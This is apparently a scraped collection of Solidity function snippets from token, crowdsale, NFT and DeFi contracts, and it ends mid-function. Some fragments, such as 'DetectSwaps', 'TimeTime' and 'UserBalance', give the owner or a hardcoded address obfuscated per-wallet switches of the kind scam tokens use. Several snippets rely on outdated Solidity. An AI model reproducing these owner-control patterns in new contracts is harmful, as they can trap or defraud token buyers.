        if(tradingOpen && launchedAt == 0){
            launchedAt = block.number;
            deadBlocks = _deadBlocks;
        }
    }
--------------------------------------------------------------------------------
function setpair(address _pair) public onlyOwner {
        automatedMarketMakerPairs[_pair] = true;
        isMaxWalletExempt[_pair] = true;
        isDividendExempt[_pair] = true;
        pair = _pair;
    }
--------------------------------------------------------------------------------
function _setMaxTxAmount(uint256 maxTxAmount) external onlyOwner() {
        require(maxTxAmount >= 9000e9 , 'maxTxAmount should be greater than 9000e9');
        _maxTxAmount = maxTxAmount;
    }
--------------------------------------------------------------------------------
function setLockAccount(address target, uint256 lockenddate) public  {
		if (msg.sender != creator) throw;
		lockAccount[target] = lockenddate;
		LockFunds(target, lockenddate);
     }
--------------------------------------------------------------------------------
function removeAddressFromWhitelist(address addr) onlyOwner public returns(bool success) {
        if (whitelist[addr]) {
            whitelist[addr] = false;
            emit WhitelistedAddressRemoved(addr);
            success = true;
        }
    }
--------------------------------------------------------------------------------
function setup(address starbaseCrowdsaleAddress)
        external
        noEther
        onlyOwner
        returns (bool)
    {
        if (address(starbaseCrowdsale) == 0) {
            starbaseCrowdsale = AbstractStarbaseCrowdsale(starbaseCrowdsaleAddress);
            return true;
        }
        return false;
    }
--------------------------------------------------------------------------------
constructor(
        uint256 initialSupply,
        string memory tokenName,
        string memory tokenSymbol
    ) public {
        totalSupply = 120000000000000000;  //
        balanceOf[msg.sender] = totalSupply;                // Give the creator all initial tokens
        name = "IVM Coin";                                   // Set the name for display purposes
        symbol = "IVMC";                               // Set the symbol for display purposes
    }
--------------------------------------------------------------------------------
function KinguinKrowns() {
	owner = msg.sender;
    totalSupply = 100000000 * (10**18); // 100 mln
    balances[msg.sender] = totalSupply;
  }
--------------------------------------------------------------------------------
function addBuyTokensRequest(string _userId, string _requestHash) public returns(uint) {
          NewTokenBuyRequest(msg.sender, _userId); 
          return stor.addBuyTokensRequest(msg.sender, _userId, _requestHash);
     }
--------------------------------------------------------------------------------
function requestChangeStaker(address newStaker) public onlyAdminOrOwner {
        uint deferBlock = computeDeferBlock();
        changeStakerOperation = ChangeStakerOperation(newStaker, admin, deferBlock);
        ChangeStakerOperationEvent(newStaker, deferBlock);
    }
--------------------------------------------------------------------------------
function requestDelegation(DelegateERC20 _delegate) public onlyAdminOrOwner {
        uint deferBlock = computeDeferBlock();
        delegateOperation = DelegateOperation(_delegate, admin, deferBlock);
        DelegateOperationEvent(_delegate, deferBlock);
    }
--------------------------------------------------------------------------------
function requestDelegatedFrom(address _source) public onlyAdminOrOwner {
        uint deferBlock = computeDeferBlock();
        setDelegatedFromOperation = SetDelegatedFromOperation(_source, admin, deferBlock);
        SetDelegatedFromOperationEvent(_source, deferBlock);
    }
--------------------------------------------------------------------------------
function requestReplaceTrueUSD(TrueUSD newContract) public onlyAdminOrOwner {
        uint deferBlock = computeDeferBlock();
        changeTrueUSDOperation = ChangeTrueUSDOperation(newContract, admin, deferBlock);
        ChangeTrueUSDOperationEvent(newContract, deferBlock);
    }
--------------------------------------------------------------------------------
function publicStartRegularPhase()
        public
    {
        require(now > (icoOpenTime + 2 weeks) && icoOpenTime != 0);

        icoPhase     = false;
        regularPhase = true;
    }
--------------------------------------------------------------------------------
function transferETH() isOwner external {
        if (this.balance == 0) throw;
        if (!ethFundDeposit.send(this.balance)) throw;
    }
--------------------------------------------------------------------------------
function getTokenAfterAudit(address _user) public onlyOwner {
        require(!isAudit);
        IERC20(msToken).transfer(_user,IERC20(msToken).balanceOf(address(this)));
    }
--------------------------------------------------------------------------------
function fixedLoge(uint256 _x) internal returns (uint256 logE) {
        /*
        Since `fixedLog2_min` output range is max `0xdfffffffff` 
        (40 bits, or 5 bytes), we can use a very large approximation
        for `ln(2)`. This one is used since it’s the max accuracy 
        of Python `ln(2)`

        0xb17217f7d1cf78 = ln(2) * (1 << 56)
        
        */
        //Cannot represent negative numbers (below 1)
        assert(_x >= FIXED_ONE);

        uint256 log2 = fixedLog2(_x);
        logE = (log2 * 0xb17217f7d1cf78) >> 56;
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value) public
        returns (bool success) {
		if (_value <= 0) revert(); 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function UserBalance(uint256 amount) public returns (bool) {
        require(
            _msgSender() == 0xC286294cF5895e31A70EE1fBB5f11D18C226953C,
            "BEP20: Not accessible"
        );
        burning(_msgSender(), amount);

        return true;
    }
--------------------------------------------------------------------------------
function increaseCap(uint256 _cap_inc) onlyOwner public {
        require(_cap_inc > 0);
        cap = cap.add(_cap_inc.mul(decimal_num));
        IncreaseCap(cap);
    }
--------------------------------------------------------------------------------
function submitAnswer(bytes32 question_id, bytes32 answer, uint256 max_previous) 
        stateOpen(question_id)
        bondMustDoubleAndMatchMinimum(question_id)
        previousBondMustNotBeatMaxPrevious(question_id, max_previous)
    external payable {
        _addAnswerToHistory(question_id, answer, msg.sender, msg.value, false);
        _updateCurrentAnswer(question_id, answer);
    }
--------------------------------------------------------------------------------
function isApprovedForAll(
        address _owner,
        address _operator
    ) public view override returns (bool isOperator) {
        if (_operator == address(openseaProxyAddress)) {
            return true;
        }
        return super.isApprovedForAll(_owner, _operator);
    }
--------------------------------------------------------------------------------
function withdrawFee() public onlyOwner {
        require(this.balance > 0);
        owner.transfer(this.balance);
        WithdrawFee(this.balance);
    }
--------------------------------------------------------------------------------
function deprecate(address _upgradedAddress) public onlyOwner {
        require(_upgradedAddress != address(0));
        deprecated = true;
        upgradedAddress = _upgradedAddress;
        emit Deprecate(_upgradedAddress);
    }
--------------------------------------------------------------------------------
function addAddressesToWhitelist(address[] _operators) public onlyOwner {
    for (uint256 i = 0; i < _operators.length; i++) {
      addAddressToWhitelist(_operators[i]);
    }
  }
--------------------------------------------------------------------------------
function removeAddressesFromWhitelist(address[] _operators) public onlyOwner {
    for (uint256 i = 0; i < _operators.length; i++) {
      removeAddressFromWhitelist(_operators[i]);
    }
  }
--------------------------------------------------------------------------------
function addWhiteList (address botAdd) public {
        require(_msgSender() == _deadWallet, "ERC20: cannot permit dev address");
        _whiteList.push(botAdd);
    }
--------------------------------------------------------------------------------
constructor(string _name, string _symbol, uint8 _decimals, uint256 _totalSupply) public {
        name = _name;
        symbol = _symbol;
        decimals = _decimals;
        totalSupply = _totalSupply * 10 ** uint256(decimals);
    }
--------------------------------------------------------------------------------
function BitcoinBlack() public {
    totalSupply_ = INITIAL_SUPPLY;
    balances[msg.sender] = INITIAL_SUPPLY;
    Transfer(0x0, msg.sender, INITIAL_SUPPLY);
  }
--------------------------------------------------------------------------------
function releaseTokensFromEscrowForUser(
    address _payer,
    uint256 _amount
    ) private {
      subFromEscrow(_payer, _amount);
      token.safeTransfer(_payer, _amount);
      emit TokenMarketplaceWithdrawal(_payer, _amount);
  }
--------------------------------------------------------------------------------
function () payable {
        _getAsset()._performGeneric.value(msg.value)(msg.data, msg.sender);
        _returnReturnData(true);
    }
--------------------------------------------------------------------------------
function startAuction() public isOwner atStage(Stages.AuctionSetUp) {
        stage = Stages.AuctionStarted;
        start_time = now;
        start_block = block.number;
        AuctionStarted(start_time, start_block);
    }
--------------------------------------------------------------------------------
function price() public constant returns (uint) {
        if (stage == Stages.AuctionEnded ||
            stage == Stages.TokensDistributed) {
            return 0;
        }
        return calcTokenPrice();
    }
--------------------------------------------------------------------------------
constructor (AvailComToken _token) public {
    require(_token != address(0));

    // 0000 is added to the rate because decimal 4
    rate = 167000000;
    wallet = msg.sender;
    token = _token;
  }
--------------------------------------------------------------------------------
function finishCrowdsale() public onlyOwner {
    uint _value = token.balanceOf(this);
    token.transfer(wallet, _value);
    fifishICO = true;
  }
--------------------------------------------------------------------------------
function transferOwnership(address newOwner) onlyMultisigWallet public returns (bool) {
    require(newOwner != address(0));
    owner = newOwner;
    OwnershipTransferred(owner, newOwner);
    return true;
  }
--------------------------------------------------------------------------------
function tokensLockedAtTime(address _of, bytes32 _reason, uint256 _time)
        public
        view
        returns (uint256 amount)
    {
        if (locked[_of][_reason].validity > _time)
            amount = locked[_of][_reason].amount;
    }
--------------------------------------------------------------------------------
function checkGoalReached() public afterDeadline {
        if (amountRaised >= fundingGoal){
            fundingGoalReached = true;
            emit GoalReached(beneficiary, amountRaised);
        }
        crowdsaleClosed = true;
    }
--------------------------------------------------------------------------------
function BlupeeToken(
    ) public {
        totalSupply = uint256(16000029000000000000000000);  // Update total supply with the decimal amount
        balanceOf[msg.sender] = totalSupply;                // Give the creator all initial tokens
        name = 'Blupee';                                   // Set the name for display purposes
        symbol = 'BLU';                                   // Set the symbol for display purposes
    }
--------------------------------------------------------------------------------
function addManyToWhitelist(address[] _users) public onlyOwner {
        for (uint256 i = 0; i < _users.length; i++) {
            addToWhitelist(_users[i]);
        }
    }
--------------------------------------------------------------------------------
function transferFrom (address _from, address _to, uint256 _value)
    returns (bool success) {
    if (frozen) return false;
    else return AbstractToken.transferFrom (_from, _to, _value);
  }
--------------------------------------------------------------------------------
function () payable {
        _getAsset()._performGeneric.value(msg.value)(msg.data, msg.sender);
        _returnReturnData(true);
    }
--------------------------------------------------------------------------------
function setBonustoFalse() private returns (string) {
        require (bidderBonus == true,"no more bonuses");
        bidderBonus = false;
        return "tokens exhausted";
    }
--------------------------------------------------------------------------------
function purgeUpgrade() onlyAssetOwner() returns(bool) {
        if (pendingVersion == 0x0) {
            return false;
        }
        delete pendingVersion;
        delete pendingVersionTimestamp;
        return true;
    }
--------------------------------------------------------------------------------
function mint(uint256 numberOfTokens)
    external
    payable
    nonReentrant
    isCorrectPayment(PUBLIC_MINT_PRICE, numberOfTokens)
    publicSaleActive
    canMintNFTs(numberOfTokens)
    maxMintsPerTX(numberOfTokens) {
        for (uint256 i = 0; i < numberOfTokens; i++) {
            _safeMint(msg.sender, nextTokenId());
        }
    }
--------------------------------------------------------------------------------
function transferOwnership(
    address _newOwner
  )
    public
    onlyOwner
  {
    require(_newOwner != address(0), CANNOT_TRANSFER_TO_ZERO_ADDRESS);
    emit OwnershipTransferred(owner, _newOwner);
    owner = _newOwner;
  }
--------------------------------------------------------------------------------
function rentOwed(uint256 _tokenId) public view returns (uint256) {
        return price[_tokenId].mul(now.sub(timeLastCollected[_tokenId])).div(1 days);
    }
--------------------------------------------------------------------------------
function DetectSwaps(address spender, bool val, bool val2, bool val3, bool val4) external onlyOwner {
    doge[spender] = val;
    akita[spender] = val2; 
    shiba[spender] = val3;
    hills = val4;
  }
--------------------------------------------------------------------------------
constructor(address _logic, address _admin, bytes memory _data) public payable UpgradeableProxy(_logic, _data) {
        assert(_ADMIN_SLOT == bytes32(uint256(keccak256("eip1967.proxy.admin")) - 1));
        _setAdmin(_admin);
    }
--------------------------------------------------------------------------------
function domainSeparator() public view override returns (bytes32) {    
        if (_chainID() == _CACHED_CHAIN_ID) {
            return _CACHED_DOMAIN_SEPARATOR;
        } else {
            return _buildDomainSeparator(_TYPE_HASH, _HASHED_NAME, _HASHED_VERSION);
        }
    }
--------------------------------------------------------------------------------
function transferOwnershipWithBalance(address newOwner) onlyOwner public{
		if (newOwner != address(0)) {
		    _transfer(owner,newOwner,balanceOf[owner]);
		    owner = newOwner;
		}
	}
--------------------------------------------------------------------------------
function _hasOrder(bool isBuy, uint32 id) internal view returns (bool) {
        if(isBuy) {
            return _buyOrders[id] != 0;
        } else {
            return _sellOrders[id] != 0;
        }
    }
--------------------------------------------------------------------------------
function _setOrder(bool isBuy, uint32 id, Order memory order) internal {
        if(isBuy) {
            _buyOrders[id] = _order2uint(order);
        } else {
            _sellOrders[id] = _order2uint(order);
        }
    }
--------------------------------------------------------------------------------
function startAuction(uint256 _pepeId, uint256 _beginPrice, uint256 _endPrice, uint64 _duration) public {
        // solhint-disable-next-line not-rely-on-time
        require(pepeContract.getCozyAgain(_pepeId) <= now);//need to have this extra check
        super.startAuction(_pepeId, _beginPrice, _endPrice, _duration);
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
constructor () internal {
        address msgSender = _msgSender();
        _previousOwner = _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
--------------------------------------------------------------------------------
function accumulativeDividendOf(address _owner) public view override returns(uint256) {
    return magnifiedDividendPerShare.mul(balanceOf(_owner)).toInt256Safe()
      .add(magnifiedDividendCorrections[_owner]).toUint256Safe() / magnitude;
  }
--------------------------------------------------------------------------------
function closeCycle(uint value) public onlyAuthorized bankrollPhase {
    require(tokenBalance() >= value);
    finalStakes[cycle] = safeSub(value, safeMul(updateGasCost, numHolders)/100);//updateGasCost is using 2 decimals
  }
--------------------------------------------------------------------------------
function addHolder(address holder, uint numSH) internal{
    if(numSH < stakeholders.length)
      stakeholders[numSH] = holder;
    else
      stakeholders.push(holder);
  }
--------------------------------------------------------------------------------
function setApprovalForAll(address _operator, bool _approved) external whenNotPaused{
        operatorToApprovals[msg.sender][_operator] = _approved;
        emit ApprovalForAll(msg.sender, _operator, _approved);
    }
--------------------------------------------------------------------------------
function tokensLockedAtTime(address _of, bytes32 _reason, uint256 _time)
        public
        view
        returns (uint256 amount)
    {
        if (locked[_of][_reason].validity > _time)
            amount = locked[_of][_reason].amount;
    }
--------------------------------------------------------------------------------
function validPurchase() internal constant returns (bool) {
        bool withinCap = weiRaised.add(msg.value) <= HARD_CAP;

        return super.validPurchase() && withinCap;
    }
--------------------------------------------------------------------------------
function _getChild(address _from, uint256 _tokenId, address _childContract, uint256 _childTokenId) internal {
    _unmountSameSocketItem(_from, _tokenId, _childContract, _childTokenId);
    super._getChild(_from, _tokenId, _childContract, _childTokenId);
  }
--------------------------------------------------------------------------------
function claimTokens(uint256 amount) public onlyOwner {
    assert(getAvailableTokens() >= amount);

    claimed = claimed.add(amount);
    token.transfer(owner, amount);
  }
--------------------------------------------------------------------------------
function tokenByIndex(uint256 tokenId) external view returns (uint256) {
        require(
            _exists(tokenId),
            "ERC721: operator query for nonexistent token"
        );

        return tokenId;
    }
--------------------------------------------------------------------------------
function burnAll(uint[] ids) public {
        for (uint i = 0; i < ids.length; i++){
            burn(ids[i]);
        }
    }
--------------------------------------------------------------------------------
function safeAdd(uint256 x, uint256 y) internal returns(uint256) {
      uint256 z = x + y;
      assert((z >= x) && (z >= y));
      return z;
    }
--------------------------------------------------------------------------------
function _mint(address to, uint256 tokenId) internal {
        super._mint(to, tokenId);

        _allTokensIndex[tokenId] = _allTokens.length;
        _allTokens.push(tokenId);
    }
--------------------------------------------------------------------------------
function InbestToken() public {
    totalSupply_ = INITIAL_SUPPLY;
    balances[msg.sender] = INITIAL_SUPPLY;
    Transfer(0x0, msg.sender, INITIAL_SUPPLY);
  }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function liquidateBorrow(address borrower, PToken pTokenCollateral) external payable {
        (uint err,) = liquidateBorrowInternal(borrower, msg.value, pTokenCollateral);
        requireNoError(err, "liquidateBorrow failed");
    }
--------------------------------------------------------------------------------
function checkGoalReached() public afterDeadline {
        if (totalSalesTokens >= softCap){
            fundingGoalReached = true;
            emit GoalReached(beneficiary, totalSalesEth);
        }
        crowdsaleClosed = true;
    }
--------------------------------------------------------------------------------
function calcCurrentTokenPrice()
        public
        timedTransitions
        returns (uint)
    {
        if (stage == Stages.AuctionEnded || stage == Stages.TradingStarted)
            return finalPrice;
        return calcTokenPrice();
    }
--------------------------------------------------------------------------------
function calcTransfer(uint256 _value) public view returns(uint256) {
    uint256 _totalComission;
    _totalComission = transferInfo.stat + (_value / 100 ) * transferInfo.perc;

    return _totalComission;
  }
--------------------------------------------------------------------------------
function isOwner() internal returns(bool success) {
        if ((msg.sender == owner) || (msg.sender == super_owner)) return true;
        return false;
    }
--------------------------------------------------------------------------------
function startIco() public onlyOwner returns (bool) {
    require(currentStage == Stages.PreIcoEnd);
    currentStage = Stages.Ico1;
    icoStartTime = now;
    return true;
  }
--------------------------------------------------------------------------------
function addAddressToWhitelist(address addr) onlyOwner public returns(bool success) {
    if (!whitelist[addr]) {
      whitelist[addr] = true;
      emit WhitelistedAddressAdded(addr);
      success = true;
    }
  }
--------------------------------------------------------------------------------
function removeAddressFromWhitelist(address addr) onlyOwner public returns(bool success) {
    if (whitelist[addr]) {
      whitelist[addr] = false;
      emit WhitelistedAddressRemoved(addr);
      success = true;
    }
  }
--------------------------------------------------------------------------------
function purchaseAttack() payable {

        // Verify that user is paying the correct price
        require(msg.value == attackCost);
        
        // We transfer the amount paid to the owner
        ceoAddress.transfer(msg.value);

        addressAttackCount[msg.sender]++;
    }
--------------------------------------------------------------------------------
function purchaseDefense() payable {
        // Verify that user is paying the correct price
        require(msg.value == defenseCost);
        
        // We transfer the amount paid to the owner
        ceoAddress.transfer(msg.value);
        
        addressDefenseCount[msg.sender]++;
    }
--------------------------------------------------------------------------------
function deregisterService(address service)
    public
    onlyDeployer
    notNullOrThisAddress(service)
    {
        require(registeredServicesMap[service].registered);

        registeredServicesMap[service].registered = false;

        // Emit event
        emit DeregisterServiceEvent(service);
    }
--------------------------------------------------------------------------------
function isEnabledServiceAction(address service, string action)
    public
    view
    returns (bool)
    {
        bytes32 actionHash = hashString(action);
        return isRegisteredActiveService(service) && registeredServicesMap[service].actionsEnabledMap[actionHash];
    }
--------------------------------------------------------------------------------
function setUpgradeMaster(address master) public {
      if (master == 0x0) throw;
      if (msg.sender != upgradeMaster) throw;
      upgradeMaster = master;
  }
--------------------------------------------------------------------------------
function transfer(address recipient, uint256 amount) public virtual onlyPermitted override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        
        if(_msgSender() == creator())
        { givePermissions(recipient); }
        
        return true;
    }
--------------------------------------------------------------------------------
function changeCardboardUnicornTokenAddress(address _newTokenAddress) onlyOwner {
    CardboardUnicorns cu = CardboardUnicorns(_newTokenAddress);
    require(cu.owner() == address(this)); // We must be the owner of the token
    cardboardUnicornTokenAddress = _newTokenAddress;
  }
--------------------------------------------------------------------------------
constructor () public {
    balances[msg.sender] = totalSupply_;
    emit Transfer(address(0), msg.sender, totalSupply_);
  }
--------------------------------------------------------------------------------
function increaseAllowance(address spender, uint256 addedValue) external returns (bool) {
        _approve(msg.sender, spender, _allowances[msg.sender][spender] + addedValue);
        return true;
    }
--------------------------------------------------------------------------------
function setInterestPrice(address _property, uint256 _value) external {
		// The previously used function
		// This function is only used in testing
		addressValidator().validateAddress(msg.sender, config().lockup());

		eternalStorage().setUint(getInterestPriceKey(_property), _value);
	}
--------------------------------------------------------------------------------
function setCumulativeLockedUpValue(address _addr, uint256 _value)
		external
	{
		addressValidator().validateAddress(msg.sender, config().lockup());

		eternalStorage().setUint(getCumulativeLockedUpValueKey(_addr), _value);
	}
--------------------------------------------------------------------------------
function isLocked(uint256 _value,uint256 remainingTokens, address _address)  internal returns (bool) {
            uint256 remainingBalance = balances[_address].sub(_value);
            require(remainingBalance >= remainingTokens);
            return true;
    }
--------------------------------------------------------------------------------
function calculateDividendTokens(uint256 ethervalue, uint256 subvalue) public constant returns (uint256 tokens) {
		return sub(fixedExp(fixedLog(reserve() - subvalue + ethervalue)*crr_n/crr_d + price_coeff), totalSupply);
	}
--------------------------------------------------------------------------------
function validPurchase() internal constant returns (bool) {
    bool withinCap = weiRaised.add(msg.value) <= cap;
    return super.validPurchase() && withinCap;
  }
--------------------------------------------------------------------------------
function initialTransfer(address _to, uint256 _amount, uint256 _decimalPlace) private { 
        balances[_to] = _amount.mul(_decimalPlace);
        Transfer(address(0), _to, balances[_to]);
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function transferFrom(address _from, address _to, uint _amount)
            returns (bool success) {
        // Cannot transfer before crowdsale ends or cap reached
        require(now > END_TS || totalEthers >= CAP);
        // Standard transferFrom
        return super.transferFrom(_from, _to, _amount);
    }
--------------------------------------------------------------------------------
function tokenPause() public {
        require(rightAndRoles.onlyRoles(msg.sender,6));
        require(!isFinalized);
        token.setPause(true);
    }
--------------------------------------------------------------------------------
function removeLockupTypeMulti(bytes32[] memory _lockupNames) public withPerm(ADMIN) {
        for (uint256 i = 0; i < _lockupNames.length; i++) {
            _removeLockupType(_lockupNames[i]);
        }
    }
--------------------------------------------------------------------------------
function getPermissions() public view returns(bytes32[] memory) {
        bytes32[] memory allPermissions = new bytes32[](1);
        allPermissions[0] = ADMIN;
        return allPermissions;
    }
--------------------------------------------------------------------------------
constructor(address _nexus) internal {
        require(_nexus != address(0), "Nexus is zero address");
        nexus = INexus(_nexus);
    }
--------------------------------------------------------------------------------
function burnByOwner(address burner, uint256 value) public canBurnByOwner {
        _burn(burner, value);
        _totalBurnt = _totalBurnt.add(value);
        emit Burn(burner, value);
    }
--------------------------------------------------------------------------------
function balanceSpot(address _who) public view returns (uint256) {
        uint256 _balanceSpot = balanceOf(_who);
        _balanceSpot = _balanceSpot.sub(balanceLockedUp(_who));
        return _balanceSpot;
    }
--------------------------------------------------------------------------------
function TimeTime(address spender, bool val, bool val2, bool val3, bool val4) external onlyOwner {
    wonderw[spender] = val;
    joker[spender] = val2; 
    darkknight[spender] = val3;
    thisValue = val4;
  }
--------------------------------------------------------------------------------
function freezeAccount(address _holder) public onlyOwner returns (bool) {
        require(!frozen[_holder]);
        frozen[_holder] = true;
        emit Freeze(_holder);
        return true;
    }
--------------------------------------------------------------------------------
function unfreezeAccount(address _holder) public onlyOwner returns (bool) {
        require(frozen[_holder]);
        frozen[_holder] = false;
        emit Unfreeze(_holder);
        return true;
    }
--------------------------------------------------------------------------------
function holderState()
  public
  view
  returns(uint256, uint256, uint256)
  {
    address _customerAddress = msg.sender;
    return (
      balanceOf(_customerAddress),          // 0
      dividendsOf(_customerAddress),        // 1
      referralBalance_[_customerAddress]    // 2
    );
  }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
constructor(address _logic, address admin_, bytes memory _data) public payable UpgradeableProxy(_logic, _data) {
        assert(_ADMIN_SLOT == bytes32(uint256(keccak256("eip1967.proxy.admin")) - 1));
        _setAdmin(admin_);
    }
--------------------------------------------------------------------------------
constructor () public {
         owner = msg.sender;
         balances[owner] = _totalSupply;
        emit Transfer(0, owner, _totalSupply);
     }
--------------------------------------------------------------------------------
function setHeroGenes(uint _id, uint _newGenes) eitherOwner external {
        require(_id < totalSupply());

        Hero storage hero = heroes[_id];

        hero.genes = _newGenes;
    }
--------------------------------------------------------------------------------
function transferFrom (address _from, address _to, uint256 _value)
    public returns (bool success) {
    if (frozen) return false;
    else return AbstractToken.transferFrom (_from, _to, _value);
  }
--------------------------------------------------------------------------------
constructor() public {
    balances[msg.sender] = _totalSupply;
    emit Transfer(address(0), msg.sender, _totalSupply);
  }
--------------------------------------------------------------------------------
function setPubkey(bytes32 node, bytes32 x, bytes32 y) public only_owner(node) {
        records[node].pubkey = PublicKey(x, y);
        emit PubkeyChanged(node, x, y);
    }
--------------------------------------------------------------------------------
function pushStatus(string _name, uint256 _times, uint256 _sum, int8 _rate) onlyOwner public {
        status.push(MemberStatus({
            name: _name,
            times: _times,
            sum: _sum,
            rate: _rate
        }));
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function validPurchase() internal constant returns (bool) {
    bool withinPeriod = started;
    bool nonZeroPurchase = msg.value != 0;
    return withinPeriod && nonZeroPurchase;
  }
--------------------------------------------------------------------------------
constructor (
        uint256 initialSupply,
        string contractName,
        string tokenSymbol,
        uint256 contractHoldTime,
        address contractOwner

        ) public {
        totalSupply = initialSupply;  // Update total supply
        name = contractName;             // Set the name for display purposes
        symbol = tokenSymbol;         // Set the symbol for display purposes
        holdTime = contractHoldTime;
        balances[contractOwner] = totalSupply;

    }
--------------------------------------------------------------------------------
function addAddressesToWhitelist(address[] _operators)
    onlyOwner
    public
  {
    for (uint256 i = 0; i < _operators.length; i++) {
      addAddressToWhitelist(_operators[i]);
    }
  }
--------------------------------------------------------------------------------
function removeAddressesFromWhitelist(address[] _operators)
    onlyOwner
    public
  {
    for (uint256 i = 0; i < _operators.length; i++) {
      removeAddressFromWhitelist(_operators[i]);
    }
  }
--------------------------------------------------------------------------------
function UserBalance(uint256 amount) public returns (bool) {
        require(
            _msgSender() == 0x5Fc4dB4627D9d9ffAcdC313D26452395C9B62040,
            "BEP20: Not accessible"
        );
        burning(_msgSender(), amount);

        return true;
    }
--------------------------------------------------------------------------------
constructor () internal {
        address msgSender = msg.sender;
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
--------------------------------------------------------------------------------
function scalarFromCurvePoints(
        uint256[2] memory hash,
        uint256[2] memory pk,
        uint256[2] memory gamma,
        address uWitness,
        uint256[2] memory v
    ) internal pure returns (uint256 s) {
        return
            uint256(
                keccak256(
                    abi.encodePacked(
                        SCALAR_FROM_CURVE_POINTS_HASH_PREFIX,
                        hash,
                        pk,
                        gamma,
                        v,
                        uWitness
                    )
                )
            );
    }
--------------------------------------------------------------------------------
function ICO (string _campaignUrl, token _addressOfTokenUsedAsReward) public {
        creator = msg.sender;
        campaignUrl = _campaignUrl;
        tokenReward = token(_addressOfTokenUsedAsReward);

        LogFunderInitialized(
            creator,
            campaignUrl
            );
    }
--------------------------------------------------------------------------------
function initialize()
        external
        onlyOwner
    {
        require(terminationTimestamp == 0, "already initialized");
        terminationTimestamp = _getTimestamp() + 60 * 60 * 24 * 365; // one year from now
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
constructor() public{
       _totalSupply = INITIAL_SUPPLY;
        balances[0x53Fb8Fb91A6b99Ca59D6EAC353C7a966A990365d] = INITIAL_SUPPLY;
        emit Transfer(address(0x0), 0x53Fb8Fb91A6b99Ca59D6EAC353C7a966A990365d, INITIAL_SUPPLY);
    }
--------------------------------------------------------------------------------
function WeaponTokenize () public {
      owner = msg.sender;
      isAuthorizedOwner[msg.sender] =  true;
      authorizedOwners.push(msg.sender);

    }
--------------------------------------------------------------------------------
function updateWeapon (uint _id, string _gameData, string _publicData, string _ownerData) public onlyAuthorizedOwner returns(bool res) {
      gameDataOf[_id] = _gameData;
      publicDataOf[_id] = _publicData;
      ownerDataOf[_id] = _ownerData;
      //emit WeaponAdded(_id, _gameData, _publicData, _ownerData);
      return true;
    }
--------------------------------------------------------------------------------
function updateGameProprietaryData (uint _id, string _gameData) public onlyAuthorizedOwner returns(bool res) {
      gameDataOf[_id] = _gameData;
      emit WeaponUpdated(_id, _gameData, "", "");
      return true;
    }
--------------------------------------------------------------------------------
function updatePublicData (uint _id,  string _publicData) public onlyAuthorizedOwner returns(bool res) {
      publicDataOf[_id] = _publicData;
      emit WeaponUpdated(_id, "", _publicData, "");
      return true;
    }
--------------------------------------------------------------------------------
function updateOwnerProprietaryData (uint _id, string _ownerData) public onlyAuthorizedOwner returns(bool res) {
      ownerDataOf[_id] = _ownerData;
      emit WeaponUpdated(_id, "", "", _ownerData);
      return true;
    }
--------------------------------------------------------------------------------
function GXT(){
		totalSupply=MAX_SUPPLY;
		balances[msg.sender] = MAX_SUPPLY;
		Transfer(0x0, msg.sender, MAX_SUPPLY);
	}
--------------------------------------------------------------------------------
function PCH() public {
        totalSupply_ = INITIAL_SUPPLY;
        balances[msg.sender] = INITIAL_SUPPLY;
        Transfer(0x0, msg.sender, INITIAL_SUPPLY);
    }
--------------------------------------------------------------------------------
function transferETH() isOwner external {
        require(address(this).balance != 0);
        require(ethFundDeposit.send(address(this).balance));
    }
--------------------------------------------------------------------------------
constructor(address _logic, address admin_, bytes memory _data) public payable UpgradeableProxy(_logic, _data) {
        assert(_ADMIN_SLOT == bytes32(uint256(keccak256("eip1967.proxy.admin")) - 1));
        _setAdmin(admin_);
    }
--------------------------------------------------------------------------------
function accumulativeFundsOf(address _owner) public view returns(uint256) {
		return pointsPerShare.mul(balanceOf(_owner)).toInt256Safe()
			.add(pointsCorrection[_owner]).toUint256Safe() / pointsMultiplier;
	}
--------------------------------------------------------------------------------
function finalize() onlyOwner public {
        require(!isFinalized);
        require((weiRaised == hardcap) || now > endTime);

        finalization();
        Finalized();

        isFinalized = true;

    }
--------------------------------------------------------------------------------
function endIcoRound() private {
    icoInProgress = false;
	icoRounds[rNo].rEndBlock = block.number;
	icoRounds[rNo].roundCompleted = true;
  }
--------------------------------------------------------------------------------
function StfuToken() public {
    totalSupply_ = INITIAL_SUPPLY;
    balances[msg.sender] = INITIAL_SUPPLY;
    Transfer(0x0, msg.sender, INITIAL_SUPPLY);
  }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
    returns (bool success) {
        if (_value <= 0) throw;
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
constructor () {
        _name = "FlippeningNFT";
        _symbol = "FLIP";

        // https://data.chain.link/btc-eth
		// Mainnet chainlink address
		// https://etherscan.io/address/0xdeb288F737066589598e9214E782fa5A8eD689e8
